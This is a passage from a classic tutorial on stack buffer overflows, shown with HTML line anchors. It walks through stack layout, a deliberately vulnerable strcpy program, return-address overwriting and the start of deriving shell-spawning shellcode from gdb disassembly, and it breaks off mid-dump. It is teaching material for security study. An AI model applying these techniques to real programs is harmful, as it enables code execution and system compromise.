<a id=__codelineno-0-185 name=__codelineno-0-185 href=#__codelineno-0-185></a>------------------------------------------------------------------------------
<a id=__codelineno-0-186 name=__codelineno-0-186 href=#__codelineno-0-186></a>
<a id=__codelineno-0-187 name=__codelineno-0-187 href=#__codelineno-0-187></a>   To understand what the program does to call function() we compile it with
<a id=__codelineno-0-188 name=__codelineno-0-188 href=#__codelineno-0-188></a>gcc using the -S switch to generate assembly code output:
<a id=__codelineno-0-189 name=__codelineno-0-189 href=#__codelineno-0-189></a>
<a id=__codelineno-0-190 name=__codelineno-0-190 href=#__codelineno-0-190></a>$ gcc -S -o example1.s example1.c
<a id=__codelineno-0-191 name=__codelineno-0-191 href=#__codelineno-0-191></a>
<a id=__codelineno-0-192 name=__codelineno-0-192 href=#__codelineno-0-192></a>   By looking at the assembly language output we see that the call to
<a id=__codelineno-0-193 name=__codelineno-0-193 href=#__codelineno-0-193></a>function() is translated to:
<a id=__codelineno-0-194 name=__codelineno-0-194 href=#__codelineno-0-194></a>
<a id=__codelineno-0-195 name=__codelineno-0-195 href=#__codelineno-0-195></a>        pushl $3
<a id=__codelineno-0-196 name=__codelineno-0-196 href=#__codelineno-0-196></a>        pushl $2
<a id=__codelineno-0-197 name=__codelineno-0-197 href=#__codelineno-0-197></a>        pushl $1
<a id=__codelineno-0-198 name=__codelineno-0-198 href=#__codelineno-0-198></a>        call function
<a id=__codelineno-0-199 name=__codelineno-0-199 href=#__codelineno-0-199></a>
<a id=__codelineno-0-200 name=__codelineno-0-200 href=#__codelineno-0-200></a>    This pushes the 3 arguments to function backwards into the stack, and
<a id=__codelineno-0-201 name=__codelineno-0-201 href=#__codelineno-0-201></a>calls function().  The instruction &#39;call&#39; will push the instruction pointer
<a id=__codelineno-0-202 name=__codelineno-0-202 href=#__codelineno-0-202></a>(IP) onto the stack.  We&#39;ll call the saved IP the return address (RET).  The
<a id=__codelineno-0-203 name=__codelineno-0-203 href=#__codelineno-0-203></a>first thing done in function is the procedure prolog:
<a id=__codelineno-0-204 name=__codelineno-0-204 href=#__codelineno-0-204></a>
<a id=__codelineno-0-205 name=__codelineno-0-205 href=#__codelineno-0-205></a>        pushl %ebp
<a id=__codelineno-0-206 name=__codelineno-0-206 href=#__codelineno-0-206></a>        movl %esp,%ebp
<a id=__codelineno-0-207 name=__codelineno-0-207 href=#__codelineno-0-207></a>        subl $20,%esp
<a id=__codelineno-0-208 name=__codelineno-0-208 href=#__codelineno-0-208></a>
<a id=__codelineno-0-209 name=__codelineno-0-209 href=#__codelineno-0-209></a>   This pushes EBP, the frame pointer, onto the stack.  It then copies the
<a id=__codelineno-0-210 name=__codelineno-0-210 href=#__codelineno-0-210></a>current SP onto EBP, making it the new FP pointer.  We&#39;ll call the saved FP
<a id=__codelineno-0-211 name=__codelineno-0-211 href=#__codelineno-0-211></a>pointer SFP.  It then allocates space for the local variables by subtracting
<a id=__codelineno-0-212 name=__codelineno-0-212 href=#__codelineno-0-212></a>their size from SP.
<a id=__codelineno-0-213 name=__codelineno-0-213 href=#__codelineno-0-213></a>
<a id=__codelineno-0-214 name=__codelineno-0-214 href=#__codelineno-0-214></a>   We must remember that memory can only be addressed in multiples of the
<a id=__codelineno-0-215 name=__codelineno-0-215 href=#__codelineno-0-215></a>word size.  A word in our case is 4 bytes, or 32 bits.  So our 5 byte buffer
<a id=__codelineno-0-216 name=__codelineno-0-216 href=#__codelineno-0-216></a>is really going to take 8 bytes (2 words) of memory, and our 10 byte buffer
<a id=__codelineno-0-217 name=__codelineno-0-217 href=#__codelineno-0-217></a>is going to take 12 bytes (3 words) of memory.  That is why SP is being
<a id=__codelineno-0-218 name=__codelineno-0-218 href=#__codelineno-0-218></a>subtracted by 20.  With that in mind our stack looks like this when
<a id=__codelineno-0-219 name=__codelineno-0-219 href=#__codelineno-0-219></a>function() is called (each space represents a byte):
<a id=__codelineno-0-220 name=__codelineno-0-220 href=#__codelineno-0-220></a>
<a id=__codelineno-0-221 name=__codelineno-0-221 href=#__codelineno-0-221></a>
<a id=__codelineno-0-222 name=__codelineno-0-222 href=#__codelineno-0-222></a>bottom of                                                            top of
<a id=__codelineno-0-223 name=__codelineno-0-223 href=#__codelineno-0-223></a>memory                                                               memory
<a id=__codelineno-0-224 name=__codelineno-0-224 href=#__codelineno-0-224></a>           buffer2       buffer1   sfp   ret   a     b     c
<a id=__codelineno-0-225 name=__codelineno-0-225 href=#__codelineno-0-225></a>&lt;------   [            ][        ][    ][    ][    ][    ][    ]
<a id=__codelineno-0-226 name=__codelineno-0-226 href=#__codelineno-0-226></a>
<a id=__codelineno-0-227 name=__codelineno-0-227 href=#__codelineno-0-227></a>top of                                                            bottom of
<a id=__codelineno-0-228 name=__codelineno-0-228 href=#__codelineno-0-228></a>stack                                                                 stack
<a id=__codelineno-0-229 name=__codelineno-0-229 href=#__codelineno-0-229></a>
<a id=__codelineno-0-230 name=__codelineno-0-230 href=#__codelineno-0-230></a>
<a id=__codelineno-0-231 name=__codelineno-0-231 href=#__codelineno-0-231></a>                               Buffer Overflows
<a id=__codelineno-0-232 name=__codelineno-0-232 href=#__codelineno-0-232></a>                               ~~~~~~~~~~~~~~~~
<a id=__codelineno-0-233 name=__codelineno-0-233 href=#__codelineno-0-233></a>
<a id=__codelineno-0-234 name=__codelineno-0-234 href=#__codelineno-0-234></a>   A buffer overflow is the result of stuffing more data into a buffer than
<a id=__codelineno-0-235 name=__codelineno-0-235 href=#__codelineno-0-235></a>it can handle.  How can this often found programming error can be taken
<a id=__codelineno-0-236 name=__codelineno-0-236 href=#__codelineno-0-236></a>advantage to execute arbitrary code?  Lets look at another example:
<a id=__codelineno-0-237 name=__codelineno-0-237 href=#__codelineno-0-237></a>
<a id=__codelineno-0-238 name=__codelineno-0-238 href=#__codelineno-0-238></a>example2.c
<a id=__codelineno-0-239 name=__codelineno-0-239 href=#__codelineno-0-239></a>------------------------------------------------------------------------------
<a id=__codelineno-0-240 name=__codelineno-0-240 href=#__codelineno-0-240></a>void function(char *str) {
<a id=__codelineno-0-241 name=__codelineno-0-241 href=#__codelineno-0-241></a>   char buffer[16];
<a id=__codelineno-0-242 name=__codelineno-0-242 href=#__codelineno-0-242></a>
<a id=__codelineno-0-243 name=__codelineno-0-243 href=#__codelineno-0-243></a>   strcpy(buffer,str);
<a id=__codelineno-0-244 name=__codelineno-0-244 href=#__codelineno-0-244></a>}
<a id=__codelineno-0-245 name=__codelineno-0-245 href=#__codelineno-0-245></a>
<a id=__codelineno-0-246 name=__codelineno-0-246 href=#__codelineno-0-246></a>void main() {
<a id=__codelineno-0-247 name=__codelineno-0-247 href=#__codelineno-0-247></a>  char large_string[256];
<a id=__codelineno-0-248 name=__codelineno-0-248 href=#__codelineno-0-248></a>  int i;
<a id=__codelineno-0-249 name=__codelineno-0-249 href=#__codelineno-0-249></a>
<a id=__codelineno-0-250 name=__codelineno-0-250 href=#__codelineno-0-250></a>  for( i = 0; i &lt; 255; i++)
<a id=__codelineno-0-251 name=__codelineno-0-251 href=#__codelineno-0-251></a>    large_string[i] = &#39;A&#39;;
<a id=__codelineno-0-252 name=__codelineno-0-252 href=#__codelineno-0-252></a>
<a id=__codelineno-0-253 name=__codelineno-0-253 href=#__codelineno-0-253></a>  function(large_string);
<a id=__codelineno-0-254 name=__codelineno-0-254 href=#__codelineno-0-254></a>}
<a id=__codelineno-0-255 name=__codelineno-0-255 href=#__codelineno-0-255></a>------------------------------------------------------------------------------
<a id=__codelineno-0-256 name=__codelineno-0-256 href=#__codelineno-0-256></a>
<a id=__codelineno-0-257 name=__codelineno-0-257 href=#__codelineno-0-257></a>   This is program has a function with a typical buffer overflow coding
<a id=__codelineno-0-258 name=__codelineno-0-258 href=#__codelineno-0-258></a>error.  The function copies a supplied string without bounds checking by
<a id=__codelineno-0-259 name=__codelineno-0-259 href=#__codelineno-0-259></a>using strcpy() instead of strncpy().  If you run this program you will get a
<a id=__codelineno-0-260 name=__codelineno-0-260 href=#__codelineno-0-260></a>segmentation violation.  Lets see what its stack looks when we call function:
<a id=__codelineno-0-261 name=__codelineno-0-261 href=#__codelineno-0-261></a>
<a id=__codelineno-0-262 name=__codelineno-0-262 href=#__codelineno-0-262></a>
<a id=__codelineno-0-263 name=__codelineno-0-263 href=#__codelineno-0-263></a>bottom of                                                            top of
<a id=__codelineno-0-264 name=__codelineno-0-264 href=#__codelineno-0-264></a>memory                                                               memory
<a id=__codelineno-0-265 name=__codelineno-0-265 href=#__codelineno-0-265></a>                  buffer            sfp   ret   *str
<a id=__codelineno-0-266 name=__codelineno-0-266 href=#__codelineno-0-266></a>&lt;------          [                ][    ][    ][    ]
<a id=__codelineno-0-267 name=__codelineno-0-267 href=#__codelineno-0-267></a>
<a id=__codelineno-0-268 name=__codelineno-0-268 href=#__codelineno-0-268></a>top of                                                            bottom of
<a id=__codelineno-0-269 name=__codelineno-0-269 href=#__codelineno-0-269></a>stack                                                                 stack
<a id=__codelineno-0-270 name=__codelineno-0-270 href=#__codelineno-0-270></a>
<a id=__codelineno-0-271 name=__codelineno-0-271 href=#__codelineno-0-271></a>
<a id=__codelineno-0-272 name=__codelineno-0-272 href=#__codelineno-0-272></a>   What is going on here?  Why do we get a segmentation violation?  Simple.
<a id=__codelineno-0-273 name=__codelineno-0-273 href=#__codelineno-0-273></a>strcpy() is coping the contents of *str (larger_string[]) into buffer[]
<a id=__codelineno-0-274 name=__codelineno-0-274 href=#__codelineno-0-274></a>until a null character is found on the string.  As we can see buffer[] is
<a id=__codelineno-0-275 name=__codelineno-0-275 href=#__codelineno-0-275></a>much smaller than *str.  buffer[] is 16 bytes long, and we are trying to stuff
<a id=__codelineno-0-276 name=__codelineno-0-276 href=#__codelineno-0-276></a>it with 256 bytes.  This means that all 250 bytes after buffer in the stack
<a id=__codelineno-0-277 name=__codelineno-0-277 href=#__codelineno-0-277></a>are being overwritten.  This includes the SFP, RET, and even *str!  We had 
<a id=__codelineno-0-278 name=__codelineno-0-278 href=#__codelineno-0-278></a>filled large_string with the character &#39;A&#39;.  It&#39;s hex character value
<a id=__codelineno-0-279 name=__codelineno-0-279 href=#__codelineno-0-279></a>is 0x41.  That means that the return address is now 0x41414141.  This is
<a id=__codelineno-0-280 name=__codelineno-0-280 href=#__codelineno-0-280></a>outside of the process address space.  That is why when the function returns
<a id=__codelineno-0-281 name=__codelineno-0-281 href=#__codelineno-0-281></a>and tries to read the next instruction from that address you get a 
<a id=__codelineno-0-282 name=__codelineno-0-282 href=#__codelineno-0-282></a>segmentation violation.
<a id=__codelineno-0-283 name=__codelineno-0-283 href=#__codelineno-0-283></a>
<a id=__codelineno-0-284 name=__codelineno-0-284 href=#__codelineno-0-284></a>   So a buffer overflow allows us to change the return address of a function.
<a id=__codelineno-0-285 name=__codelineno-0-285 href=#__codelineno-0-285></a>In this way we can change the flow of execution of the program.  Lets go back
<a id=__codelineno-0-286 name=__codelineno-0-286 href=#__codelineno-0-286></a>to our first example and recall what the stack looked like:
<a id=__codelineno-0-287 name=__codelineno-0-287 href=#__codelineno-0-287></a>
<a id=__codelineno-0-288 name=__codelineno-0-288 href=#__codelineno-0-288></a>
<a id=__codelineno-0-289 name=__codelineno-0-289 href=#__codelineno-0-289></a>bottom of                                                            top of
<a id=__codelineno-0-290 name=__codelineno-0-290 href=#__codelineno-0-290></a>memory                                                               memory
<a id=__codelineno-0-291 name=__codelineno-0-291 href=#__codelineno-0-291></a>           buffer2       buffer1   sfp   ret   a     b     c
<a id=__codelineno-0-292 name=__codelineno-0-292 href=#__codelineno-0-292></a>&lt;------   [            ][        ][    ][    ][    ][    ][    ]
<a id=__codelineno-0-293 name=__codelineno-0-293 href=#__codelineno-0-293></a>
<a id=__codelineno-0-294 name=__codelineno-0-294 href=#__codelineno-0-294></a>top of                                                            bottom of
<a id=__codelineno-0-295 name=__codelineno-0-295 href=#__codelineno-0-295></a>stack                                                                 stack
<a id=__codelineno-0-296 name=__codelineno-0-296 href=#__codelineno-0-296></a>
<a id=__codelineno-0-297 name=__codelineno-0-297 href=#__codelineno-0-297></a>
<a id=__codelineno-0-298 name=__codelineno-0-298 href=#__codelineno-0-298></a>   Lets try to modify our first example so that it overwrites the return
<a id=__codelineno-0-299 name=__codelineno-0-299 href=#__codelineno-0-299></a>address, and demonstrate how we can make it execute arbitrary code.  Just
<a id=__codelineno-0-300 name=__codelineno-0-300 href=#__codelineno-0-300></a>before buffer1[] on the stack is SFP, and before it, the return address.
<a id=__codelineno-0-301 name=__codelineno-0-301 href=#__codelineno-0-301></a>That is 4 bytes pass the end of buffer1[].  But remember that buffer1[] is
<a id=__codelineno-0-302 name=__codelineno-0-302 href=#__codelineno-0-302></a>really 2 word so its 8 bytes long.  So the return address is 12 bytes from
<a id=__codelineno-0-303 name=__codelineno-0-303 href=#__codelineno-0-303></a>the start of buffer1[].  We&#39;ll modify the return value in such a way that the
<a id=__codelineno-0-304 name=__codelineno-0-304 href=#__codelineno-0-304></a>assignment statement &#39;x = 1;&#39; after the function call will be jumped.  To do
<a id=__codelineno-0-305 name=__codelineno-0-305 href=#__codelineno-0-305></a>so we add 8 bytes to the return address.  Our code is now:
<a id=__codelineno-0-306 name=__codelineno-0-306 href=#__codelineno-0-306></a>
<a id=__codelineno-0-307 name=__codelineno-0-307 href=#__codelineno-0-307></a>example3.c:
<a id=__codelineno-0-308 name=__codelineno-0-308 href=#__codelineno-0-308></a>------------------------------------------------------------------------------
<a id=__codelineno-0-309 name=__codelineno-0-309 href=#__codelineno-0-309></a>void function(int a, int b, int c) {
<a id=__codelineno-0-310 name=__codelineno-0-310 href=#__codelineno-0-310></a>   char buffer1[5];
<a id=__codelineno-0-311 name=__codelineno-0-311 href=#__codelineno-0-311></a>   char buffer2[10];
<a id=__codelineno-0-312 name=__codelineno-0-312 href=#__codelineno-0-312></a>   int *ret;
<a id=__codelineno-0-313 name=__codelineno-0-313 href=#__codelineno-0-313></a>
<a id=__codelineno-0-314 name=__codelineno-0-314 href=#__codelineno-0-314></a>   ret = buffer1 + 12;
<a id=__codelineno-0-315 name=__codelineno-0-315 href=#__codelineno-0-315></a>   (*ret) += 8;
<a id=__codelineno-0-316 name=__codelineno-0-316 href=#__codelineno-0-316></a>}
<a id=__codelineno-0-317 name=__codelineno-0-317 href=#__codelineno-0-317></a>
<a id=__codelineno-0-318 name=__codelineno-0-318 href=#__codelineno-0-318></a>void main() {
<a id=__codelineno-0-319 name=__codelineno-0-319 href=#__codelineno-0-319></a>  int x;
<a id=__codelineno-0-320 name=__codelineno-0-320 href=#__codelineno-0-320></a>
<a id=__codelineno-0-321 name=__codelineno-0-321 href=#__codelineno-0-321></a>  x = 0;
<a id=__codelineno-0-322 name=__codelineno-0-322 href=#__codelineno-0-322></a>  function(1,2,3);
<a id=__codelineno-0-323 name=__codelineno-0-323 href=#__codelineno-0-323></a>  x = 1;
<a id=__codelineno-0-324 name=__codelineno-0-324 href=#__codelineno-0-324></a>  printf(&quot;%d\n&quot;,x);
<a id=__codelineno-0-325 name=__codelineno-0-325 href=#__codelineno-0-325></a>}
<a id=__codelineno-0-326 name=__codelineno-0-326 href=#__codelineno-0-326></a>------------------------------------------------------------------------------
<a id=__codelineno-0-327 name=__codelineno-0-327 href=#__codelineno-0-327></a>
<a id=__codelineno-0-328 name=__codelineno-0-328 href=#__codelineno-0-328></a>   What we have done is add 12 to buffer1[]&#39;s address.  This new address is
<a id=__codelineno-0-329 name=__codelineno-0-329 href=#__codelineno-0-329></a>where the return address is stored.  We want to skip pass the assignment to
<a id=__codelineno-0-330 name=__codelineno-0-330 href=#__codelineno-0-330></a>the printf call.  How did we know to add 8 to the return address?  We used a
<a id=__codelineno-0-331 name=__codelineno-0-331 href=#__codelineno-0-331></a>test value first (for example 1), compiled the program, and then started gdb:
<a id=__codelineno-0-332 name=__codelineno-0-332 href=#__codelineno-0-332></a>
<a id=__codelineno-0-333 name=__codelineno-0-333 href=#__codelineno-0-333></a>------------------------------------------------------------------------------
<a id=__codelineno-0-334 name=__codelineno-0-334 href=#__codelineno-0-334></a>[aleph1]$ gdb example3
<a id=__codelineno-0-335 name=__codelineno-0-335 href=#__codelineno-0-335></a>GDB is free software and you are welcome to distribute copies of it
<a id=__codelineno-0-336 name=__codelineno-0-336 href=#__codelineno-0-336></a> under certain conditions; type &quot;show copying&quot; to see the conditions.
<a id=__codelineno-0-337 name=__codelineno-0-337 href=#__codelineno-0-337></a>There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details.
<a id=__codelineno-0-338 name=__codelineno-0-338 href=#__codelineno-0-338></a>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
<a id=__codelineno-0-339 name=__codelineno-0-339 href=#__codelineno-0-339></a>(no debugging symbols found)...
<a id=__codelineno-0-340 name=__codelineno-0-340 href=#__codelineno-0-340></a>(gdb) disassemble main
<a id=__codelineno-0-341 name=__codelineno-0-341 href=#__codelineno-0-341></a>Dump of assembler code for function main:
<a id=__codelineno-0-342 name=__codelineno-0-342 href=#__codelineno-0-342></a>0x8000490 &lt;main&gt;:       pushl  %ebp
<a id=__codelineno-0-343 name=__codelineno-0-343 href=#__codelineno-0-343></a>0x8000491 &lt;main+1&gt;:     movl   %esp,%ebp
<a id=__codelineno-0-344 name=__codelineno-0-344 href=#__codelineno-0-344></a>0x8000493 &lt;main+3&gt;:     subl   $0x4,%esp
<a id=__codelineno-0-345 name=__codelineno-0-345 href=#__codelineno-0-345></a>0x8000496 &lt;main+6&gt;:     movl   $0x0,0xfffffffc(%ebp)
<a id=__codelineno-0-346 name=__codelineno-0-346 href=#__codelineno-0-346></a>0x800049d &lt;main+13&gt;:    pushl  $0x3
<a id=__codelineno-0-347 name=__codelineno-0-347 href=#__codelineno-0-347></a>0x800049f &lt;main+15&gt;:    pushl  $0x2
<a id=__codelineno-0-348 name=__codelineno-0-348 href=#__codelineno-0-348></a>0x80004a1 &lt;main+17&gt;:    pushl  $0x1
<a id=__codelineno-0-349 name=__codelineno-0-349 href=#__codelineno-0-349></a>0x80004a3 &lt;main+19&gt;:    call   0x8000470 &lt;function&gt;
<a id=__codelineno-0-350 name=__codelineno-0-350 href=#__codelineno-0-350></a>0x80004a8 &lt;main+24&gt;:    addl   $0xc,%esp
<a id=__codelineno-0-351 name=__codelineno-0-351 href=#__codelineno-0-351></a>0x80004ab &lt;main+27&gt;:    movl   $0x1,0xfffffffc(%ebp)
<a id=__codelineno-0-352 name=__codelineno-0-352 href=#__codelineno-0-352></a>0x80004b2 &lt;main+34&gt;:    movl   0xfffffffc(%ebp),%eax
<a id=__codelineno-0-353 name=__codelineno-0-353 href=#__codelineno-0-353></a>0x80004b5 &lt;main+37&gt;:    pushl  %eax
<a id=__codelineno-0-354 name=__codelineno-0-354 href=#__codelineno-0-354></a>0x80004b6 &lt;main+38&gt;:    pushl  $0x80004f8
<a id=__codelineno-0-355 name=__codelineno-0-355 href=#__codelineno-0-355></a>0x80004bb &lt;main+43&gt;:    call   0x8000378 &lt;printf&gt;
<a id=__codelineno-0-356 name=__codelineno-0-356 href=#__codelineno-0-356></a>0x80004c0 &lt;main+48&gt;:    addl   $0x8,%esp
<a id=__codelineno-0-357 name=__codelineno-0-357 href=#__codelineno-0-357></a>0x80004c3 &lt;main+51&gt;:    movl   %ebp,%esp
<a id=__codelineno-0-358 name=__codelineno-0-358 href=#__codelineno-0-358></a>0x80004c5 &lt;main+53&gt;:    popl   %ebp
<a id=__codelineno-0-359 name=__codelineno-0-359 href=#__codelineno-0-359></a>0x80004c6 &lt;main+54&gt;:    ret
<a id=__codelineno-0-360 name=__codelineno-0-360 href=#__codelineno-0-360></a>0x80004c7 &lt;main+55&gt;:    nop
<a id=__codelineno-0-361 name=__codelineno-0-361 href=#__codelineno-0-361></a>------------------------------------------------------------------------------
<a id=__codelineno-0-362 name=__codelineno-0-362 href=#__codelineno-0-362></a>
<a id=__codelineno-0-363 name=__codelineno-0-363 href=#__codelineno-0-363></a>   We can see that when calling function() the RET will be 0x8004a8, and we
<a id=__codelineno-0-364 name=__codelineno-0-364 href=#__codelineno-0-364></a>want to jump past the assignment at 0x80004ab.  The next instruction we want
<a id=__codelineno-0-365 name=__codelineno-0-365 href=#__codelineno-0-365></a>to execute is the at 0x8004b2.  A little math tells us the distance is 8
<a id=__codelineno-0-366 name=__codelineno-0-366 href=#__codelineno-0-366></a>bytes.
<a id=__codelineno-0-367 name=__codelineno-0-367 href=#__codelineno-0-367></a>
<a id=__codelineno-0-368 name=__codelineno-0-368 href=#__codelineno-0-368></a>
<a id=__codelineno-0-369 name=__codelineno-0-369 href=#__codelineno-0-369></a>                                  Shell Code
<a id=__codelineno-0-370 name=__codelineno-0-370 href=#__codelineno-0-370></a>                                  ~~~~~~~~~~
<a id=__codelineno-0-371 name=__codelineno-0-371 href=#__codelineno-0-371></a>
<a id=__codelineno-0-372 name=__codelineno-0-372 href=#__codelineno-0-372></a>   So now that we know that we can modify the return address and the flow of
<a id=__codelineno-0-373 name=__codelineno-0-373 href=#__codelineno-0-373></a>execution, what program do we want to execute?  In most cases we&#39;ll simply
<a id=__codelineno-0-374 name=__codelineno-0-374 href=#__codelineno-0-374></a>want the program to spawn a shell.  From the shell we can then issue other
<a id=__codelineno-0-375 name=__codelineno-0-375 href=#__codelineno-0-375></a>commands as we wish.  But what if there is no such code in the program we
<a id=__codelineno-0-376 name=__codelineno-0-376 href=#__codelineno-0-376></a>are trying to exploit?  How can we place arbitrary instruction into its
<a id=__codelineno-0-377 name=__codelineno-0-377 href=#__codelineno-0-377></a>address space?  The answer is to place the code with are trying to execute in
<a id=__codelineno-0-378 name=__codelineno-0-378 href=#__codelineno-0-378></a>the buffer we are overflowing, and overwrite the return address so it points
<a id=__codelineno-0-379 name=__codelineno-0-379 href=#__codelineno-0-379></a>back into the buffer.  Assuming the stack starts at address 0xFF, and that S
<a id=__codelineno-0-380 name=__codelineno-0-380 href=#__codelineno-0-380></a>stands for the code we want to execute the stack would then look like this:
<a id=__codelineno-0-381 name=__codelineno-0-381 href=#__codelineno-0-381></a>
<a id=__codelineno-0-382 name=__codelineno-0-382 href=#__codelineno-0-382></a>
<a id=__codelineno-0-383 name=__codelineno-0-383 href=#__codelineno-0-383></a>bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
<a id=__codelineno-0-384 name=__codelineno-0-384 href=#__codelineno-0-384></a>memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
<a id=__codelineno-0-385 name=__codelineno-0-385 href=#__codelineno-0-385></a>           buffer                sfp   ret   a     b     c
<a id=__codelineno-0-386 name=__codelineno-0-386 href=#__codelineno-0-386></a>
<a id=__codelineno-0-387 name=__codelineno-0-387 href=#__codelineno-0-387></a>&lt;------   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
<a id=__codelineno-0-388 name=__codelineno-0-388 href=#__codelineno-0-388></a>           ^                            |
<a id=__codelineno-0-389 name=__codelineno-0-389 href=#__codelineno-0-389></a>           |____________________________|
<a id=__codelineno-0-390 name=__codelineno-0-390 href=#__codelineno-0-390></a>top of                                                            bottom of
<a id=__codelineno-0-391 name=__codelineno-0-391 href=#__codelineno-0-391></a>stack                                                                 stack
<a id=__codelineno-0-392 name=__codelineno-0-392 href=#__codelineno-0-392></a>
<a id=__codelineno-0-393 name=__codelineno-0-393 href=#__codelineno-0-393></a>
<a id=__codelineno-0-394 name=__codelineno-0-394 href=#__codelineno-0-394></a>The code to spawn a shell in C looks like:
<a id=__codelineno-0-395 name=__codelineno-0-395 href=#__codelineno-0-395></a>
<a id=__codelineno-0-396 name=__codelineno-0-396 href=#__codelineno-0-396></a>shellcode.c
<a id=__codelineno-0-397 name=__codelineno-0-397 href=#__codelineno-0-397></a>-----------------------------------------------------------------------------
<a id=__codelineno-0-398 name=__codelineno-0-398 href=#__codelineno-0-398></a>#include &lt;stdio.h&gt;
<a id=__codelineno-0-399 name=__codelineno-0-399 href=#__codelineno-0-399></a>
<a id=__codelineno-0-400 name=__codelineno-0-400 href=#__codelineno-0-400></a>void main() {
<a id=__codelineno-0-401 name=__codelineno-0-401 href=#__codelineno-0-401></a>   char *name[2];
<a id=__codelineno-0-402 name=__codelineno-0-402 href=#__codelineno-0-402></a>
<a id=__codelineno-0-403 name=__codelineno-0-403 href=#__codelineno-0-403></a>   name[0] = &quot;/bin/sh&quot;;
<a id=__codelineno-0-404 name=__codelineno-0-404 href=#__codelineno-0-404></a>   name[1] = NULL;
<a id=__codelineno-0-405 name=__codelineno-0-405 href=#__codelineno-0-405></a>   execve(name[0], name, NULL);
<a id=__codelineno-0-406 name=__codelineno-0-406 href=#__codelineno-0-406></a>}
<a id=__codelineno-0-407 name=__codelineno-0-407 href=#__codelineno-0-407></a>------------------------------------------------------------------------------
<a id=__codelineno-0-408 name=__codelineno-0-408 href=#__codelineno-0-408></a>
<a id=__codelineno-0-409 name=__codelineno-0-409 href=#__codelineno-0-409></a>   To find out what does it looks like in assembly we compile it, and start
<a id=__codelineno-0-410 name=__codelineno-0-410 href=#__codelineno-0-410></a>up gdb.  Remember to use the -static flag. Otherwise the actual code the
<a id=__codelineno-0-411 name=__codelineno-0-411 href=#__codelineno-0-411></a>for the execve system call will not be included.  Instead there will be a
<a id=__codelineno-0-412 name=__codelineno-0-412 href=#__codelineno-0-412></a>reference to dynamic C library that would normally would be linked in at
<a id=__codelineno-0-413 name=__codelineno-0-413 href=#__codelineno-0-413></a>load time.
<a id=__codelineno-0-414 name=__codelineno-0-414 href=#__codelineno-0-414></a>
<a id=__codelineno-0-415 name=__codelineno-0-415 href=#__codelineno-0-415></a>------------------------------------------------------------------------------
<a id=__codelineno-0-416 name=__codelineno-0-416 href=#__codelineno-0-416></a>[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
<a id=__codelineno-0-417 name=__codelineno-0-417 href=#__codelineno-0-417></a>[aleph1]$ gdb shellcode
<a id=__codelineno-0-418 name=__codelineno-0-418 href=#__codelineno-0-418></a>GDB is free software and you are welcome to distribute copies of it
<a id=__codelineno-0-419 name=__codelineno-0-419 href=#__codelineno-0-419></a> under certain conditions; type &quot;show copying&quot; to see the conditions.
<a id=__codelineno-0-420 name=__codelineno-0-420 href=#__codelineno-0-420></a>There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details.
<a id=__codelineno-0-421 name=__codelineno-0-421 href=#__codelineno-0-421></a>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
<a id=__codelineno-0-422 name=__codelineno-0-422 href=#__codelineno-0-422></a>(gdb) disassemble main
<a id=__codelineno-0-423 name=__codelineno-0-423 href=#__codelineno-0-423></a>Dump of assembler code for function main:
<a id=__codelineno-0-424 name=__codelineno-0-424 href=#__codelineno-0-424></a>0x8000130 &lt;main&gt;:       pushl  %ebp
<a id=__codelineno-0-425 name=__codelineno-0-425 href=#__codelineno-0-425></a>0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
<a id=__codelineno-0-426 name=__codelineno-0-426 href=#__codelineno-0-426></a>0x8000133 &lt;main+3&gt;:     subl   $0x8,%esp
<a id=__codelineno-0-427 name=__codelineno-0-427 href=#__codelineno-0-427></a>0x8000136 &lt;main+6&gt;:     movl   $0x80027b8,0xfffffff8(%ebp)
<a id=__codelineno-0-428 name=__codelineno-0-428 href=#__codelineno-0-428></a>0x800013d &lt;main+13&gt;:    movl   $0x0,0xfffffffc(%ebp)
<a id=__codelineno-0-429 name=__codelineno-0-429 href=#__codelineno-0-429></a>0x8000144 &lt;main+20&gt;:    pushl  $0x0
<a id=__codelineno-0-430 name=__codelineno-0-430 href=#__codelineno-0-430></a>0x8000146 &lt;main+22&gt;:    leal   0xfffffff8(%ebp),%eax
<a id=__codelineno-0-431 name=__codelineno-0-431 href=#__codelineno-0-431></a>0x8000149 &lt;main+25&gt;:    pushl  %eax
<a id=__codelineno-0-432 name=__codelineno-0-432 href=#__codelineno-0-432></a>0x800014a &lt;main+26&gt;:    movl   0xfffffff8(%ebp),%eax
<a id=__codelineno-0-433 name=__codelineno-0-433 href=#__codelineno-0-433></a>0x800014d &lt;main+29&gt;:    pushl  %eax
<a id=__codelineno-0-434 name=__codelineno-0-434 href=#__codelineno-0-434></a>0x800014e &lt;main+30&gt;:    call   0x80002bc &lt;__execve&gt;
<a id=__codelineno-0-435 name=__codelineno-0-435 href=#__codelineno-0-435></a>0x8000153 &lt;main+35&gt;:    addl   $0xc,%esp
<a id=__codelineno-0-436 name=__codelineno-0-436 href=#__codelineno-0-436></a>0x8000156 &lt;main+38&gt;:    movl   %ebp,%esp
<a id=__codelineno-0-437 name=__codelineno-0-437 href=#__codelineno-0-437></a>0x8000158 &lt;main+40&gt;:    popl   %ebp
<a id=__codelineno-0-438 name=__codelineno-0-438 href=#__codelineno-0-438></a>0x8000159 &lt;main+41&gt;:    ret
<a id=__codelineno-0-439 name=__codelineno-0-439 href=#__codelineno-0-439></a>End of assembler dump.
<a id=__codelineno-0-440 name=__codelineno-0-440 href=#__codelineno-0-440></a>(gdb) disassemble __execve
<a id=__codelineno-0-441 name=__codelineno-0-441 href=#__codelineno-0-441></a>Dump of assembler code for function __execve:
<a id=__codelineno-0-442 name=__codelineno-0-442 href=#__codelineno-0-442></a>0x80002bc &lt;__execve&gt;:   pushl  %ebp
<a id=__codelineno-0-443 name=__codelineno-0-443 href=#__codelineno-0-443></a>0x80002bd &lt;__execve+1&gt;: movl   %esp,%ebp
<a id=__codelineno-0-444 name=__codelineno-0-444 href=#__codelineno-0-444></a>0x80002bf &lt;__execve+3&gt;: pushl  %ebx
